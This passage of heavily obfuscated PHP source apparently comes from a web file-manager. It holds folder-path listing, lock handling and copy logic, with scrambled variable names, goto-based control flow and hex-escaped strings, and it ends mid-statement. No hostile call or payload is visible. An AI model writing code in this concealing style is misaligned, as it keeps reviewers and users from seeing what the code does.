$this->parentLevelArray($E“™¥ä•ß[$Aâ«ô’‘Ş­[455]]); $AƒÈ®ñºÍ = $this->_listAppendPathRoot($E“™¥ä•ß, $A®×™î”µ˜); foreach ($A®×™î”µ˜ as $aèÒ££œ÷) { if (isset($E©Ëõ¦Ë¡[$aèÒ££œ÷])) { $AƒÈ®ñºÍ .= $E©Ëõ¦Ë¡[$aèÒ££œ÷] . $Aâ«ô’‘Ş­[8]; } } goto A²‘«Äª‘; F«Ô¹’Ú‹Ä: } goto Dšˆ¦àŠÙ; d…Õ­³ãŞ: $Aâ«ô’‘Ş­ =& $_SERVER[Ö]; $E©Ëõ¦Ë¡ = array(); foreach ($A„ã¦íà as &$E“™¥ä•ß) { $E©Ëõ¦Ë¡[$E“™¥ä•ß[$Aâ«ô’‘Ş­[365]]] = $E“™¥ä•ß[$Aâ«ô’‘Ş­[28]]; $A®×™î”µ˜ = $this->parentLevelArray($E“™¥ä•ß[$Aâ«ô’‘Ş­[455]]); array_shift($A®×™î”µ˜); foreach ($A®×™î”µ˜ as $aèÒ££œ÷) { if (!isset($E©Ëõ¦Ë¡[$aèÒ££œ÷])) { $E©Ëõ¦Ë¡[$aèÒ££œ÷] = 0; } } } goto Fó‘‘‹•; Dšˆ¦àŠÙ: } private function _listAppendPathRecycle(&$aÆÜˆ´ÏŠ, $D¢ğÚ¢³, $DÈÖ¡Ö¬ß§) { goto d¦‘è§ÛÚö; fóöÕäŠõã: $aÆÜˆ´ÏŠ[$A§”É¬Äù[455]] = $A§”É¬Äù[466] . implode($A§”É¬Äù[47], array_slice($D¢ğÚ¢³, 1)) . $A§”É¬Äù[47]; if ($aÆÜˆ´ÏŠ[$A§”É¬Äù[365]] == $DÈÖ¡Ö¬ß§) { $aÆÜˆ´ÏŠ[$A§”É¬Äù[455]] = $A§”É¬Äù[466]; $aÆÜˆ´ÏŠ[$A§”É¬Äù[457]] = $A§”É¬Äù[464]; $aÆÜˆ´ÏŠ[$A§”É¬Äù[28]] = LNG($A§”É¬Äù[465]); } $aÆÜˆ´ÏŠ[$A§”É¬Äù[467]] = $A§”É¬Äù[468]; goto DÓä†¤Œµ²; d¦‘è§ÛÚö: $A§”É¬Äù =& $_SERVER[Ö]; if (intval($aÆÜˆ´ÏŠ[$A§”É¬Äù[367]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($DÈÖ¡Ö¬ß§, $D¢ğÚ¢³) && $aÆÜˆ´ÏŠ[$A§”É¬Äù[365]] != $DÈÖ¡Ö¬ß§) { return; } goto EµÑŠ£Ğ’; EµÑŠ£Ğ’: $A•Ï´±ë„ç = explode($A§”É¬Äù[8], trim($aÆÜˆ´ÏŠ[$A§”É¬Äù[462]], $A§”É¬Äù[8])); $cŒ¼ù›á = implode($A§”É¬Äù[8], array_slice($A•Ï´±ë„ç, 2)); $aÆÜˆ´ÏŠ[$A§”É¬Äù[462]] = $A§”É¬Äù[8] . LNG($A§”É¬Äù[465]) . $A§”É¬Äù[8] . ltrim($cŒ¼ù›á, $A§”É¬Äù[8]); goto fóöÕäŠõã; DÓä†¤Œµ²: } protected function _listAppendPathRoot(&$A™„ÕéÂßò, $dá®ˆ¡‘È§) { $bàÍÆ®ª„Û =& $_SERVER[Ö]; $Aİ…Ò—è¹† = $bàÍÆ®ª„Û[33]; if ($A™„ÕéÂßò[$bàÍÆ®ª„Û[367]] == self::TYPE_USER) { if (defined($bàÍÆ®ª„Û[423]) && $A™„ÕéÂßò[$bàÍÆ®ª„Û[452]] == USER_ID) { $Aİ…Ò—è¹† = LNG($bàÍÆ®ª„Û[469]); if (!$dá®ˆ¡‘È§) { $A™„ÕéÂßò[$bàÍÆ®ª„Û[28]] = $Aİ…Ò—è¹†; } } else { $BŠë§Æ™Ğà = Model($bàÍÆ®ª„Û[470])->getInfoSimple($A™„ÕéÂßò[$bàÍÆ®ª„Û[452]]); $Aİ…Ò—è¹† = LNG($bàÍÆ®ª„Û[471]) . $bàÍÆ®ª„Û[153] . $BŠë§Æ™Ğà[$bàÍÆ®ª„Û[28]] . $bàÍÆ®ª„Û[472]; } } else { if ($A™„ÕéÂßò[$bàÍÆ®ª„Û[367]] == self::TYPE_GROUP) { $BŠë§Æ™Ğà = Model($bàÍÆ®ª„Û[454])->getInfoSimple($A™„ÕéÂßò[$bàÍÆ®ª„Û[452]]); $Aİ…Ò—è¹† = $BŠë§Æ™Ğà[$bàÍÆ®ª„Û[28]]; } else { if ($A™„ÕéÂßò[$bàÍÆ®ª„Û[367]] == self::TYPE_SYSTEM) { $BŠë§Æ™Ğà = $this->sourceInfo($dá®ˆ¡‘È§[0], !0); $Aİ…Ò—è¹† = $BŠë§Æ™Ğà[$bàÍÆ®ª„Û[28]]; } } } $Aİ…Ò—è¹† = $Aİ…Ò—è¹† ? $bàÍÆ®ª„Û[8] . $Aİ…Ò—è¹† . $bàÍÆ®ª„Û[8] : $bàÍÆ®ª„Û[8]; return $Aİ…Ò—è¹†; } protected function _listAppendUser(&$E·„Ğï‰¹å) { $Cç“Ÿ†‹ =& $_SERVER[Ö]; $d«†ñ©é† = array_to_keyvalue($E·„Ğï‰¹å, $Cç“Ÿ†‹[33], $Cç“Ÿ†‹[374]); $F„¼‚İáš§ = array_to_keyvalue($E·„Ğï‰¹å, $Cç“Ÿ†‹[33], $Cç“Ÿ†‹[375]); $D¿¶Í¡Áá¢ = array_merge($d«†ñ©é†, $F„¼‚İáš§); $fåÀÔ¡‚ = Model($Cç“Ÿ†‹[473])->userListInfo($D¿¶Í¡Áá¢); foreach ($E·„Ğï‰¹å as &$Dù¿¹¨ÜàÖ) { $e³É‹øÉ„ = $Dù¿¹¨ÜàÖ[$Cç“Ÿ†‹[374]]; $Dù¿¹¨ÜàÖ[$Cç“Ÿ†‹[374]] = $fåÀÔ¡‚[$e³É‹øÉ„] ? $fåÀÔ¡‚[$e³É‹øÉ„] : !1; $e³É‹øÉ„ = $Dù¿¹¨ÜàÖ[$Cç“Ÿ†‹[375]]; $Dù¿¹¨ÜàÖ[$Cç“Ÿ†‹[375]] = $fåÀÔ¡‚[$e³É‹øÉ„] ? $fåÀÔ¡‚[$e³É‹øÉ„] : !1; if (isset($Dù¿¹¨ÜàÖ[$Cç“Ÿ†‹[413]]) && $Dù¿¹¨ÜàÖ[$Cç“Ÿ†‹[413]][$Cç“Ÿ†‹[474]]) { $B†Ë·ÏÂïî = $GLOBALS[$Cç“Ÿ†‹[6]][$Cç“Ÿ†‹[84]][$Cç“Ÿ†‹[475]]; if ($Dù¿¹¨ÜàÖ[$Cç“Ÿ†‹[413]][$Cç“Ÿ†‹[476]] <= time() - $B†Ë·ÏÂïî) { $this->metaSet($Dù¿¹¨ÜàÖ[$Cç“Ÿ†‹[365]], $Cç“Ÿ†‹[474], null); $this->metaSet($Dù¿¹¨ÜàÖ[$Cç“Ÿ†‹[365]], $Cç“Ÿ†‹[476], null); unset($Dù¿¹¨ÜàÖ[$Cç“Ÿ†‹[413]][$Cç“Ÿ†‹[474]]); continue; } $f´ì·Õå¡Ü = $Dù¿¹¨ÜàÖ[$Cç“Ÿ†‹[413]][$Cç“Ÿ†‹[474]]; $Dù¿¹¨ÜàÖ[$Cç“Ÿ†‹[413]][$Cç“Ÿ†‹[477]] = Model($Cç“Ÿ†‹[473])->getInfoSimpleOuter($f´ì·Õå¡Ü); } } } public function parentLevelArray($cÙÁØÊÀ·ä) { $a©ØöŒµäß =& $_SERVER[Ö]; $cÙÁØÊÀ·ä = explode($a©ØöŒµäß[47], trim($cÙÁØÊÀ·ä, $a©ØöŒµäß[47])); return array_remove_value($cÙÁØÊÀ·ä, $a©ØöŒµäß[464]); } public function listAll($E«ÍÅ®é—ñ) { goto d¦§¡åŸ©; C‘Çğ¬Ğó: $bàÅÜëæŒ¨ = array(); foreach ($eÕ­¼ŒÜÔ’ as $f²åºØàİ => $AªÍ²å¿ŞŸ) { goto DİÜ´Í‰ºÎ; b³ë¾µ•ˆ“: $CÆ¤İ—Ï½Á = str_replace($b¿ß–ÔÉ¤[463], $b¿ß–ÔÉ¤[8], $CÆ¤İ—Ï½Á); $CÆ¤İ—Ï½Á = str_replace($b¿ß–ÔÉ¤[463], $b¿ß–ÔÉ¤[8], $CÆ¤İ—Ï½Á); $BŸ®¡¬Ø¶• = array($b¿ß–ÔÉ¤[383] => str_replace($b¿ß–ÔÉ¤[463], $b¿ß–ÔÉ¤[8], $CÆ¤İ—Ï½Á), $b¿ß–ÔÉ¤[484] => intval($AªÍ²å¿ŞŸ[$b¿ß–ÔÉ¤[366]]), $b¿ß–ÔÉ¤[387] => $this->pathInfoFilter($AªÍ²å¿ŞŸ, !0)); goto Fµ”‡Úªµ; DİÜ´Í‰ºÎ: $BÎ°øÂ‚çŸ = $this->parentLevelArray($AªÍ²å¿ŞŸ[$b¿ß–ÔÉ¤[455]]); array_shift($BÎ°øÂ‚çŸ); $CÆ¤İ—Ï½Á = $cĞéé©½™; goto dÄ¥Æ££ªÄ; Fµ”‡Úªµ: if (!$AªÍ²å¿ŞŸ[$b¿ß–ÔÉ¤[366]]) { $BŸ®¡¬Ø¶•[$b¿ß–ÔÉ¤[415]] = $AªÍ²å¿ŞŸ[$b¿ß–ÔÉ¤[415]]; $BŸ®¡¬Ø¶•[$b¿ß–ÔÉ¤[485]] = $AªÍ²å¿ŞŸ[$b¿ß–ÔÉ¤[75]]; } $bàÅÜëæŒ¨[] = $BŸ®¡¬Ø¶•; goto bÅİÎ†äĞ‹; dÄ¥Æ££ªÄ: for ($c‘ƒ„ƒªšã = 0; $c‘ƒ„ƒªšã < count($BÎ°øÂ‚çŸ); $c‘ƒ„ƒªšã++) { $CÆ¤İ—Ï½Á .= $eÕ­¼ŒÜÔ’[$BÎ°øÂ‚çŸ[$c‘ƒ„ƒªšã]][$b¿ß–ÔÉ¤[28]] . $b¿ß–ÔÉ¤[8]; } $CÆ¤İ—Ï½Á .= $AªÍ²å¿ŞŸ[$b¿ß–ÔÉ¤[28]]; if ($AªÍ²å¿ŞŸ[$b¿ß–ÔÉ¤[366]]) { $CÆ¤İ—Ï½Á .= $b¿ß–ÔÉ¤[8]; } goto b³ë¾µ•ˆ“; bÅİÎ†äĞ‹: } return $bàÅÜëæŒ¨; goto dãõÕñŞ§¢; CßñĞÙğ²: $eÒ¬œÄŠ†— = $b¿ß–ÔÉ¤[482]; $e„ä½¯õÉ = "\114\x45\106\124\x20\x4a\x4f\111\x4e\40{$this->tablePrefix}\151\x6f\137\x66\x69\x6c\x65\x20\146\151\154\145\x20\157\156\40\x73\157\x75\x72\x63\x65\56\146\x69\154\x65\x49\104\40\75\x20\x66\x69\154\145\x2e\x66\151\154\x65\x49\x44"; $eÕ­¼ŒÜÔ’ = $this->alias($b¿ß–ÔÉ¤[483])->field($eÒ¬œÄŠ†—)->where($CïÓŠºÊ±¬)->join($e„ä½¯õÉ)->select(); goto FÖ—¸Ä²È¥; FÖ—¸Ä²È¥: $this->_listAppendAuth($eÕ­¼ŒÜÔ’); $this->_listAppendUser($eÕ­¼ŒÜÔ’); $this->_listAppendPath($eÕ­¼ŒÜÔ’); goto d ²Óñ­„›; d ²Óñ­„›: $eÕ­¼ŒÜÔ’ = array_to_keyvalue($eÕ­¼ŒÜÔ’, $b¿ß–ÔÉ¤[365]); $cĞéé©½™ = "\x2f{$Fàš®ÚÈåè[$b¿ß–ÔÉ¤[28]]}\57"; $cĞéé©½™ = $cĞéé©½™ == $b¿ß–ÔÉ¤[463] ? $b¿ß–ÔÉ¤[8] : $cĞéé©½™; goto C‘Çğ¬Ğó; d¦§¡åŸ©: $b¿ß–ÔÉ¤ =& $_SERVER[Ö]; $Fàš®ÚÈåè = $this->sourceInfo($E«ÍÅ®é—ñ); $CïÓŠºÊ±¬ = array($b¿ß–ÔÉ¤[478] => array($b¿ß–ÔÉ¤[479], $Fàš®ÚÈåè[$b¿ß–ÔÉ¤[455]] . $E«ÍÅ®é—ñ . $b¿ß–ÔÉ¤[480]), $b¿ß–ÔÉ¤[481] => 0); goto CßñĞÙğ²; dãõÕñŞ§¢: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($a‹Ñ¡ŠÁŠ¬) { goto a§Ó¹ë‡éÍ; CÂƒª: $F—†œáö´Ä = 1; $this->_lockEvent($a‹Ñ¡ŠÁŠ¬, array($CÄç¼ğŠËÍ[487], $CÄç¼ğŠËÍ[488]), $F—†œáö´Ä); $this->_lockParent($a‹Ñ¡ŠÁŠ¬, array($CÄç¼ğŠËÍ[488]), $F—†œáö´Ä); goto eŠ©ºÙ»‘É; eŠ©ºÙ»‘É: $this->_lockEvent($a‹Ñ¡ŠÁŠ¬, array($CÄç¼ğŠËÍ[489], $CÄç¼ğŠËÍ[490]), $F—†œáö´Ä); $this->_lockCheckEnd($CÄç¼ğŠËÍ[486], $a‹Ñ¡ŠÁŠ¬); goto Bì…º»â; a§Ó¹ë‡éÍ: $CÄç¼ğŠËÍ =& $_SERVER[Ö]; if (!$this->allowLock()) { return; } $this->_lockCheck($CÄç¼ğŠËÍ[486], $a‹Ñ¡ŠÁŠ¬); goto CÂƒª; Bì…º»â: } public function lockCopyEnd($fçÆÄ ÁÑØ) { $CÛ‡Æˆ‡Şõ =& $_SERVER[Ö]; if (!$this->allowLock()) { return; } $bÊß‚Ä³À = 0; $this->_lockEvent($fçÆÄ ÁÑØ, array($CÛ‡Æˆ‡Şõ[487], $CÛ‡Æˆ‡Şõ[488]), $bÊß‚Ä³À); $this->_lockParent($fçÆÄ ÁÑØ, array($CÛ‡Æˆ‡Şõ[488]), $bÊß‚Ä³À); $this->_lockEvent($fçÆÄ ÁÑØ, array($CÛ‡Æˆ‡Şõ[489], $CÛ‡Æˆ‡Şõ[490]), $bÊß‚Ä³À); } public function lockWriteStart($B„¯Ş±½çÃ, $b½•¡ˆß¯» = '') { goto BÈ¶ÚÕ©÷Â; E§£ôğÅÜŸ: $this->_lockParent($B„¯Ş±½çÃ, array($F«¾¥ÇËÎÄ[486], $F«¾¥ÇËÎÄ[488]), $C÷ ÒÛã¥à); $this->_lockCheckEnd($F«¾¥ÇËÎÄ[487], $B„¯Ş±½çÃ); goto eÉö„Œ­ƒÒ; EÛ¦Ã…ê„Ì: $C÷ ÒÛã¥à = 1; $this->_lockKey($F«¾¥ÇËÎÄ[491] . $B„¯Ş±½çÃ . $F«¾¥ÇËÎÄ[91] . $b½•¡ˆß¯», $C÷ ÒÛã¥à); $this->_lockEvent($B„¯Ş±½çÃ, array($F«¾¥ÇËÎÄ[486], $F«¾¥ÇËÎÄ[488]), $C÷ ÒÛã¥à); goto E§£ôğÅÜŸ; BÈ¶ÚÕ©÷Â: $F«¾¥ÇËÎÄ =& $_SERVER[Ö]; if (!$this->allowLock()) { return; } $this->_lockCheck($F«¾¥ÇËÎÄ[487], $B„¯Ş±½çÃ); goto EÛ¦Ã…ê„Ì; eÉö„Œ­ƒÒ: } public function lockWriteEnd($bö—¡´õ˜, $dƒ¯Äß‰Ñ = '') { $fÖ…ì…ğ¹ =& $_SERVER[Ö]; if (!$this->allowLock()) { return; } $eÉ¬¸ÜÔÂ = 0; $this->_lockKey($fÖ…ì…ğ¹[491] . $bö—¡´õ˜ . $fÖ…ì…ğ¹[91] . $dƒ¯Äß‰Ñ, $eÉ¬¸ÜÔÂ); $this->_lockEvent($bö—¡´õ˜, array($fÖ…ì…ğ¹[486], $fÖ…ì…ğ¹[488]), $eÉ¬¸ÜÔÂ); $this->_lockParent($bö—¡´õ˜, array($fÖ…ì…ğ¹[486], $fÖ…ì…ğ¹[488]), $eÉ¬¸ÜÔÂ); } public function lockMoveStart($e¨…âªÄÎ‘) { goto fóÊÃïïìÊ; d­Ä”Õ‰çÎ: $this->_lockParent($e¨…âªÄÎ‘, array($EÇÓ“ƒ¢±[486], $EÇÓ“ƒ¢±[488]), $dîé¦Ø¬ä¹); $this->_lockEvent($e¨…âªÄÎ‘, array($EÇÓ“ƒ¢±[493], $EÇÓ“ƒ¢±[489], $EÇÓ“ƒ¢±[490]), $dîé¦Ø¬ä¹); $this->_lockCheckEnd($EÇÓ“ƒ¢±[488], $e¨…âªÄÎ‘); goto dŸ«ÏøŒ˜ ; fóÊÃïïìÊ: $EÇÓ“ƒ¢± =& $_SERVER[Ö]; if (!$this->allowLock()) { return; } $this->_lockCheck($EÇÓ“ƒ¢±[488], $e¨…âªÄÎ‘); goto D®„³Á¡Š; D®„³Á¡Š: $dîé¦Ø¬ä¹ = 1; $this->_lockKey($EÇÓ“ƒ¢±[492] . $e¨…âªÄÎ‘, $dîé¦Ø¬ä¹); $this->_lockEvent($e¨…âªÄÎ‘, array($EÇÓ“ƒ¢±[486], $EÇÓ“ƒ¢±[487]), $dîé¦Ø¬ä¹); goto d­Ä”Õ‰çÎ; dŸ«ÏøŒ˜ : } public function lockMoveEnd($CšŞƒÛ°»Ğ) { goto F‡¼ÚĞ½Ù; F‡¼ÚĞ½Ù: $FôæÔòœ» =& $_SERVER[Ö]; if (!$this->allowLock()) { return; } $eˆ´åô¤‰È = 0; goto e©Èª¦¯Üö; e©Èª¦¯Üö: $this->_lockKey($FôæÔòœ»[492] . $CšŞƒÛ°»Ğ, $eˆ´åô¤‰È); $this->_lockEvent($CšŞƒÛ°»Ğ, array($FôæÔòœ»[486], $FôæÔòœ»[487]), $eˆ´åô¤‰È); $this->_lockParent($CšŞƒÛ°»Ğ, array($FôæÔòœ»[486], $FôæÔòœ»[488]), $eˆ´åô¤‰È); goto b‰°¼Ü½ãô; b‰°¼Ü½ãô: $this->_lockEvent($CšŞƒÛ°»Ğ, array($FôæÔòœ»[493], $FôæÔòœ»[489], $FôæÔòœ»[490]), $eˆ´åô¤‰È); goto aÊŒ¬ìÓ; aÊŒ¬ìÓ: } private function _lockCheck($bœŸÜ½éÂ¿, $E‘¹‰—ä…) { goto fÌ£‹ïëç; e¯§ƒç¦Ó”: CacheLock::setErrorMsg($DâÙÙ–ùÔ[153] . htmlspecialchars($D–Ø«š÷”ğ[$DâÙÙ–ùÔ[28]]) . $DâÙÙ–ùÔ[472] . $aÕÅ¸§ÈŸ); $this->_lockKey($dÂ®±ñ›Ñí, 1); $this->_lockKey($dÂ®±ñ›Ñí, 0); goto eªŸ¼äÔ²; eªŸ¼äÔ²: $fô‘÷Üâ” = array_reverse($this->parentLevelArray($D–Ø«š÷”ğ[$DâÙÙ–ùÔ[455]])); foreach ($fô‘÷Üâ” as $a·ˆ¨¥ÓÏ¿) { $dÂ®±ñ›Ñí = $bœŸÜ½éÂ¿ . $DâÙÙ–ùÔ[495] . $a·ˆ¨¥ÓÏ¿; if (CacheLock::lockGet($DâÙÙ–ùÔ[496] . $dÂ®±ñ›Ñí)) { $D–Ø«š÷”ğ = $this->sourceInfo($a·ˆ¨¥ÓÏ¿); CacheLock::setErrorMsg($DâÙÙ–ùÔ[153] . htmlspecialchars($D–Ø«š÷”ğ[$DâÙÙ–ùÔ[28]]) . $DâÙÙ–ùÔ[472] . $aÕÅ¸§ÈŸ); $this->_lockKey($dÂ®±ñ›Ñí, 1); $this->_lockKey($dÂ®±ñ›Ñí, 0); } } goto bÄâÊ™õôù; fÌ£‹ïëç: $DâÙÙ–ùÔ =& $_SERVER[Ö]; $D–Ø«š÷”ğ = $this->sourceInfo($E‘¹‰—ä…); $dÂ®±ñ›Ñí = $bœŸÜ½éÂ¿ . $DâÙÙ–ùÔ[91] . $E‘¹‰—ä…; goto bË³Éç„êÌ; bË³Éç„êÌ: $this->_lockTimeStart[$dÂ®±ñ›Ñí] = timeFloat(); if (!is_array($D–Ø«š÷”ğ)) { return; } $aÕÅ¸§ÈŸ = LNG($DâÙÙ–ùÔ[494]); goto e¯§ƒç¦Ó”; bÄâÊ™õôù: } private function _lockCheckEnd($cæ‹ê·¨, $FÃ‰šâÅ) { goto a˜¨§ô‘äƒ; dõ„ŠŸ“é²: if ($D«ÄŒ™âá > 0.5) { unset(self::$cacheSourceInfo[$d ï“íÏ……[406] . $FÃ‰šâÅ]); } $F‘ÙŠî›«Ç = $this->sourceInfo($FÃ‰šâÅ); if (!$F‘ÙŠî›«Ç) { show_json(LNG($d ï“íÏ……[100]), !1); } goto Bë–¯‡ÓìÜ; fÖñÓ›Ó„: if (!isset($this->_lockTimeStart[$e—î›š‚ˆ])) { return; } $D«ÄŒ™âá = timeFloat() - $this->_lockTimeStart[$e—î›š‚ˆ]; unset($this->_lockTimeStart[$e—î›š‚ˆ]); goto dõ„ŠŸ“é²; a˜¨§ô‘äƒ: $d ï“íÏ…… =& $_SERVER[Ö]; $e—î›š‚ˆ = $cæ‹ê·¨ . $d ï“íÏ……[91] . $FÃ‰šâÅ; CacheLock::setErrorMsg($d ï“íÏ……[357]); goto fÖñÓ›Ó„; Bë–¯‡ÓìÜ: } private function _lockParent($CÒÂ‚Êêé, $fæ¯„âºŸ, $bËŒˆƒÏ‘Æ) { if (!$this->autoLockSet) { return; } $F÷İ„ÛÍ = $this->sourceInfo($CÒÂ‚Êêé); if (!is_array($F÷İ„ÛÍ)) { return; } $eâƒº†ğ¯¹ = array_reverse($this->parentLevelArray($F÷İ„ÛÍ[$_SERVER[Ö][455]])); foreach ($eâƒº†ğ¯¹ as $f¯”ÚØœã) { $this->_lockEvent($f¯”ÚØœã, $fæ¯„âºŸ, $bËŒˆƒÏ‘Æ); } } private function _lockEvent($E ÆÌ¯ÇÜµ, $Dš£·äØË–, $Fõò®êŞö) { $c­Æ‹Áİ¼­ =& $_SERVER[Ö]; if (!$this->autoLockSet) { return; } foreach ($Dš£·äØË– as $A¯‡•ÓëÆ) { $Eİ…¹°Áñ¿ = $A¯‡•ÓëÆ . $c­Æ‹Áİ¼­[91] . $E ÆÌ¯ÇÜµ; if ($Fõò®êŞö && CacheLock::lockGet($c­Æ‹Áİ¼­[496] . $Eİ…¹°Áñ¿)) { continue; } $this->_lockKey($Eİ…¹°Áñ¿, $Fõò®êŞö); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($bõÙ‰ß±ê¡, $e§˜ÁÑÕ ¶ = 1) { $E—®ÓÏà÷ = $_SERVER[Ö][496] . md5($bõÙ‰ß±ê¡); if ($e§˜ÁÑÕ ¶) { if (isset(self::$_lockItemArr[$E—®ÓÏà÷])) { return; } self::$_lockItemArr[$E—®ÓÏà÷] = 1; CacheLock::lock($E—®ÓÏà÷, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$E—®ÓÏà÷])) { return; } unset(self::$_lockItemArr[$E—®ÓÏà÷]); CacheLock::unlock($E—®ÓÏà÷); } } public function isParentOf($dÀ°ÀÆÍÜ˜, $bÏ½âßÁÛ) { goto E¬˜Ò§‚î”; aÔÃÎòÁÊë: $EŠ ·Á·ò½ = $b¼‰ŠåœğÛ[$bà¢¿ô¼†[455]] . $b¼‰ŠåœğÛ[$bà¢¿ô¼†[365]] . $bà¢¿ô¼†[47]; $Bñõ·®Í•í = $d±©È·ÏÓÉ[$bà¢¿ô¼†[455]] . $d±©È·ÏÓÉ[$bà¢¿ô¼†[365]] . $bà¢¿ô¼†[47]; $A†„Æ±Æ–— = strpos($Bñõ·®Í•í, $EŠ ·Á·ò½) === 0; goto a«…ìã¢‘; a«…ìã¢‘: return $A†„Æ±Æ–—; goto bŠÜöëÉ—Ú; E¬˜Ò§‚î”: $bà¢¿ô¼† =& $_SERVER[Ö]; $b¼‰ŠåœğÛ = $this->sourceInfo($dÀ°ÀÆÍÜ˜); $d±©È·ÏÓÉ = $this->sourceInfo($bÏ½âßÁÛ); goto aÔÃÎòÁÊë; bŠÜöëÉ—Ú: } private $targetIsDelete = 0; public function copy($B©˜¯Ã†¿À, $cĞ’ç´Á»¡, $e”ôíõ…“£ = REPEAT_REPLACE, $B¨èãÌ”×÷ = '') { goto DÌÄ’Şİ‚; a éİ‰ˆà¯: $this->updateModifyTime($cĞ’ç´Á»¡); return $fÒõñªî¯; goto aÀø·ÇšÂÒ; e¾±˜‚…–: if (!$CŸ÷¦±¸¸” || !$D»¿§àÉ || $D»¿§àÉ[$cØİ‚´ÓŒ©[366]] != $cØİ‚´ÓŒ©[83]) { return !1; } if ($this->isParentOf($B©˜¯Ã†¿À, $cĞ’ç´Á»¡)) { return !1; } $DÚ·Ô‹ºØù = $B¨èãÌ”×÷ ? $B¨èãÌ”×÷ : $CŸ÷¦±¸¸”[$cØİ‚´ÓŒ©[28]]; goto bàçº³˜²™; EïÂİ®ğ±Ê: if ($CŸ÷¦±¸¸”[$cØİ‚´ÓŒ©[366]] == $cØİ‚´ÓŒ©[83] && $b™é–Àºº­ == $fÒõñªî¯) { $this->folderSizeResetChildren($b™é–Àºº­); } Model($cØİ‚´ÓŒ©[500])->addAll($aõçŒÄìí[$cØİ‚´ÓŒ©[498]], array(), !0); if ($b™é–Àºº­ != $fÒõñªî¯ || $CŸ÷¦±¸¸”[$cØİ‚´ÓŒ©[366]] == $cØİ‚´ÓŒ©[83]) { Model($cØİ‚´ÓŒ©[501])->eventCopy($fÒõñªî¯); } goto F³™˜ Áš; bàçº³˜²™: $this->lockCopyStart($B©˜¯Ã†¿À); $this->lockWriteStart($cĞ’ç´Á»¡, $DÚ·Ô‹ºØù); $aõçŒÄìí = array($cØİ‚´ÓŒ©[497] => array(), $cØİ‚´ÓŒ©[498] => array(), $cØİ‚´ÓŒ©[499] => array()); goto Fƒ§©ŠÅâ—; DÌÄ’Şİ‚: $cØİ‚´ÓŒ© =& $_SERVER[Ö]; $CŸ÷¦±¸¸” = $this->sourceInfo($B©˜¯Ã†¿À); $D»¿§àÉ = $this->sourceInfo($cĞ’ç´Á»¡); goto e¾±˜‚…–; Fƒ§©ŠÅâ—: $this->targetIsDelete = intval($CŸ÷¦±¸¸”[$cØİ‚´ÓŒ©[393]]); $b™é–Àºº­ = $this->fileNameExistCache($cĞ’ç´Á»¡, $CŸ÷¦±¸¸”[$cØİ‚´ÓŒ©[28]]); $fÒõñªî¯ = $this->_copy($B©˜¯Ã†¿À, $cĞ’ç´Á»¡, $e”ôíõ…“£, $aõçŒÄìí, !0, $B¨èãÌ”×÷); goto f•Î«†Ô‹‚; f•Î«†Ô‹‚: $this->_childrenListClear(); $this->lockCopyEnd($B©˜¯Ã†¿À); $this->lockWriteEnd($cĞ’ç´Á»¡, $DÚ·Ô‹ºØù); goto EïÂİ®ğ±Ê; F³™˜ Áš: $this->saveAll($aõçŒÄìí[$cØİ‚´ÓŒ©[499]]); Model($cØİ‚´ÓŒ©[163])->linkAdd($aõçŒÄìí[$cØİ‚´ÓŒ©[497]]); $this->folderSizeReset($cĞ’ç´Á»¡); goto a éİ‰ˆà¯; aÀø·ÇšÂÒ: } private function _copy($eóñŠ®¸šÈ, $C“¡´¢ê’ø, $eÊ¹·¾¨òî, &$dŠ²ñùØËß, $CƒÏÇô…Ã, $B™«×Ş‚Ì = '') { goto bƒ‹ÙšÂÈ³; CğƒÁ‘×“Š: $A×‰”™Ä± = $B™«×Ş‚Ì ? $B™«×Ş‚Ì : $dˆºãªÏ•¤[$cª·‡…‰’È[28]]; $D½â„Æ“•Ì = $this->fileNameExistCache($C“¡´¢ê’ø, $A×‰”™Ä±); if ($CƒÏÇô…Ã) { $this->_childrenAllMake($eóñŠ®¸šÈ); if ($Aõœ„“ÂÜ && $D½â„Æ“•Ì) { $this->_childrenAllMake($D½â„Æ“•Ì); } } goto DŠÕò¶¾çÙ; bƒ‹ÙšÂÈ³: $cª·‡…‰’È =& $_SERVER[Ö]; $dˆºãªÏ•¤ = $this->sourceInfoCache($eóñŠ®¸šÈ); $Aõœ„“ÂÜ = $dˆºãªÏ•¤[$cª·‡…‰’È[366]] == $cª·‡…‰’È[83]; goto CğƒÁ‘×“Š; DŠÕò¶¾çÙ: if (!$D½â„Æ“•Ì) { return $this->_copyCreate($eóñŠ®¸šÈ, $C“¡´¢ê’ø, $A×‰”™Ä±, $dŠ²ñùØËß); } $b°ˆ‹‚å± = $D½â„Æ“•Ì; if ($Aõœ„“ÂÜ) { if ($eÊ¹·¾¨òî == REPEAT_RENAME_FOLDER) { $A×‰”™Ä± = $this->fileNameAutoCache($C“¡´¢ê’ø, $A×‰”™Ä±, $eÊ¹·¾¨òî, $Aõœ„“ÂÜ); $b°ˆ‹‚å± = $this->_copyCreate($eóñŠ®¸šÈ, $C“¡´¢ê’ø, $A×‰”™Ä±, $dŠ²ñùØËß); } else { $eğÈ·•·‚‡ = $this->_childrenList($eóñŠ®¸šÈ); foreach ($eğÈ·•·‚‡ as $DÍØÛ”ÖÚ) { $this->_copy($DÍØÛ”ÖÚ[$cª·‡…‰’È[365]], $D½â„Æ“•Ì, $eÊ¹·¾¨òî, $dŠ²ñùØËß, !1); } } } else { if ($eÊ¹·¾¨òî == REPEAT_RENAME || $eÊ¹·¾¨òî == REPEAT_RENAME_FOLDER) { $A×‰”™Ä± = $this->fileNameAutoCache($C“¡´¢ê’ø, $A×‰”™Ä±, $eÊ¹·¾¨òî, $Aõœ„“ÂÜ); $b°ˆ‹‚å± = $this->_copyCreate($eóñŠ®¸šÈ, $C“¡´¢ê’ø, $A×‰”™Ä±, $dŠ²ñùØËß); } else { if ($eÊ¹·¾¨òî == REPEAT_REPLACE) { $a›ŸÉ÷¢‚ = $this->sourceInfoCache($D½â„Æ“•Ì); $d¹¹œİ«Ÿâ = $this->fileHistory($a›ŸÉ÷¢‚, $dˆºãªÏ•¤[$cª·‡…‰’È[415]], $dˆºãªÏ•¤[$cª·‡…‰’È[77]]); if ($d¹¹œİ«Ÿâ) { $dŠ²ñùØËß[$cª·‡…‰’È[497]][] = $dˆºãªÏ•¤[$cª·‡…‰’È[415]]; } } else { if ($eÊ¹·¾¨òî == 